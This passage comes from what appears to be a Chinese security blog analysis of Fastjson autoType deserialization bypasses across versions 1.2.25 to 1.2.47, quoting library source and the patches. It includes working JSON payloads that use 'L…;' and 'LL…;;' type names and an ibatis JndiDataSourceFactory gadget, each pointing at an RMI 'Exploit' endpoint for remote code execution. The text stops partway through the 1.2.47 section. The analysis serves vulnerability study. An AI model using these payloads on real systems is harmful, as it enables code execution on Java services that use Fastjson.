<p>这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。</p>
<h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>所以接下来所谓的绕过都是在服务端显性开启<code>AutoTypeSupport为True</code>的情况下进行的。（这是一个很大的限制条件）</p>
<p>我们先来看显性修改<code>AutoTypeSupport为True</code>时的代码：</p>
<p><code>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">		</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">		   <span class="comment">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span></span><br><span class="line">            <span class="comment">//需要注意这百年所谓的匹配都是startsWith开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回加载的class</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见在显性关闭白名单的情况下，我们也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。</p>
<p>看似我们只能找到其他的利用类跟黑名单进行硬刚。但我们再跟一下类的加载<code>TypeUtils.loadClass</code>就会有所发现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">    	<span class="comment">//特殊处理1！</span></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//特殊处理2！</span></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p>
<p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p>
</li>
<li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p>
</li>
</ul>
<p>那么加上<code>L</code>开头<code>;</code>结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.2.25-41绕过 jndi ldap</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">//1.2.25-41绕过 7u21</span><br><span class="line">同样加上L;，payload太长了且不唯一，就不写了</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22edebfj326g15vtmt.jpg" alt="1.2.25-jndi-计算器.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae228422cj323s12utl9.jpg" alt="1.2.41-jndi-计算器.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22090njj31yh16gn9j.jpg" alt="1.2.41-7u21-计算器.png"></p>
<h3 id="1-2-42版本修复"><a href="#1-2-42版本修复" class="headerlink" title="1.2.42版本修复"></a>1.2.42版本修复</h3><p>在1.2.42中对于1.2.41版本进行了修复，对于两个jar进行对比可以发现<code>DefaultJSONParser.java</code>没有什么关键的修改。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21szagqj32bc0y5430.jpg" alt="1.41-1.42比较.png"></p>
<p>关键是在<code>ParserConfig.java</code>中修改了以下两点：</p>
<ol>
<li>修改明文黑名单为黑名单hash</li>
<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>
</ol>
<p>黑名单大致形式如下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21hu6b9j30gf0cxq3f.jpg" alt="1.2.42黑名单hash.png"></p>
<p>虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写<code>com.alibaba.fastjson.parser.ParserConfig#addDeny</code>中的<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">fnv1a_64</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> hashCode = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i)&#123;</span><br><span class="line">            <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">            hashCode ^= ch;</span><br><span class="line">            hashCode *= <span class="number">0x100000001b3L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//可以注意到，计算hash是遍历每一位进行固定的异或和乘法运算进行累积运算</span></span><br></pre></td></tr></table></figure>
<p>有一个<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">Github项目</a>就是完成了这样的事情，并列出了目前已经得到的hash。</p>
<p>再是对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code>。</p>
<p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// hash算法常量</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line"><span class="comment">// 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾</span></span><br><span class="line"><span class="comment">// 可以发现这边只进行了一次删除</span></span><br><span class="line">      <span class="keyword">if</span> ((((BASIC</span><br><span class="line">              ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">              * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// 计算处理后的类名的前三个字符的hash</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> h3 = (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">long</span> hash = h3;</span><br><span class="line">          <span class="comment">//基于前三个字符的hash结果继续进行hash运算</span></span><br><span class="line">          <span class="comment">//这边一位一位运算比较其实就相当于之前的startswith，开头匹配</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">              hash ^= className.charAt(i);</span><br><span class="line">              hash *= PRIME;</span><br><span class="line">              <span class="comment">//将运算结果跟白名单做比对</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                  clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                  <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                      <span class="keyword">return</span> clazz;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//将运算结果跟黑名单做比对</span></span><br><span class="line">              <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//之后就是一样的处理，根据类名加载类</span></span><br></pre></td></tr></table></figure>
<p>确实有效的干掉了L开头；结尾的payload。</p>
<h3 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h3><p>但是可以发现在以上的处理中，只删除了一次开头的<code>L</code>和结尾的<code>;</code>，这里就好像使用黑名单预防SQL注入，只删除了一次敏感词汇的防御错误一样，重复一下就可以被轻易的绕过。所以payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.2.42绕过 jndi ldap</span><br><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.RowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">//1.2.42绕过 7u21</span><br><span class="line">同样加上LL ;;，payload太长了且不唯一，就不写了</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20ylpp2j31qk0m27b7.jpg" alt="1.2.42-绕过jndi-计算器.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae216919uj31rr0u5wo1.jpg" alt="1.2.42绕过7u21-计算器.png"></p>
<h3 id="1-2-43版本修复"><a href="#1-2-43版本修复" class="headerlink" title="1.2.43版本修复"></a>1.2.43版本修复</h3><p>在1.2.43中对于1.2.42版本可绕过的情况进行了修复。</p>
<p>修改了<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>的部分代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hash计算基础参数</span></span><br><span class="line"><span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line"><span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="comment">//L开头，；结尾</span></span><br><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="comment">//LL开头</span></span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="comment">//直接爆出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见就对了LL开头的绕过进行了封堵。</p>
<p>至此我们之前的两个利用链JdbcRowSetImpl和TemplatesImpl正式被封堵了（暂时）。在服务端放开白名单限制的情况下也绕不过黑名单。更别说服务端默认是开启白名单的，这时候fastjson的风险已经很小了。</p>
<p>之后就是不断有新的组件作为利用链引入进行攻击，和黑名单的不断扩充之间的拉锯战。（之前也说过着一切都是在显性关闭白名单的情况下）</p>
<h3 id="1-2-44-限制"><a href="#1-2-44-限制" class="headerlink" title="1.2.44 [ 限制"></a>1.2.44 [ 限制</h3><p>1.2.44补充了loadclass时<code>[</code>的利用情况，上面说到过，实际上这种形式的payload是用不了的。</p>
<p>比如FastjsonExpliot框架中的<code>{&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;###RMI_LDAP_ADDRESS###&quot;,&quot;autoCommit&quot;:true}</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20r1rm1j31jx12n79e.jpg" alt="1.2.42-左括号-失败.png"></p>
<p>但是在1.2.44中仍然对于这类类名进行了限制，使用同样的payload进行测试。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae20kc2g7j31qu1010yj.jpg" alt="1.2.44-左括号-失败.png"></p>
<h3 id="1-2-45-黑名单添加"><a href="#1-2-45-黑名单添加" class="headerlink" title="1.2.45 黑名单添加"></a>1.2.45 黑名单添加</h3><p>1.2.45添加了黑名单，封堵了一些可以绕过黑名单的payload，比如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//需要有第三方组件ibatis-core 3:0</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;rmi://localhost:1099/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。</p>
<p>之后更新的版本比如1.2.46也都在补充黑名单</p>
<p>但是在1.2.47时，一个全新的payload就没有这种限制，通杀。</p>
<h3 id="1-2-47-通杀payload！"><a href="#1-2-47-通杀payload！" class="headerlink" title="1.2.47 通杀payload！"></a>1.2.47 通杀payload！</h3><p>我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。</p>
<p>我们重新来理一下<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。</p>
<p>我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="comment">//1.typeName为null的情况，略</span></span><br><span class="line">	</span><br><span class="line">    	<span class="comment">//2.typeName太长或太短的情况，略</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">//3.替换typeName中$为.，略</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">//4.使用hash的方式去判断[开头，或L开头;结尾，直接报错</span></span><br><span class="line">    	<span class="comment">//这里经过几版的修改，有点不一样了，但是绕不过，也略</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的</span></span><br><span class="line">        <span class="comment">//(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)</span></span><br><span class="line">    	<span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    	<span class="comment">//6.从一个Mapping中获取这个类名的类，我们之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//7.从反序列化器中获取这个类名的类，我们也之后看</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//8.如果在6，7中找到了clazz，这里直接return出去，不继续了</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">		   <span class="comment">//无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 9. 针对默认白名单开启情况的处理，这里</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">long</span> hash = h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">				<span class="comment">//碰到黑名单就死</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">				<span class="comment">//满足白名单可以活，但是白名单默认是空的</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">					<span class="comment">//针对expectCLass的特殊处理，没有expectCLass，不管</span></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span 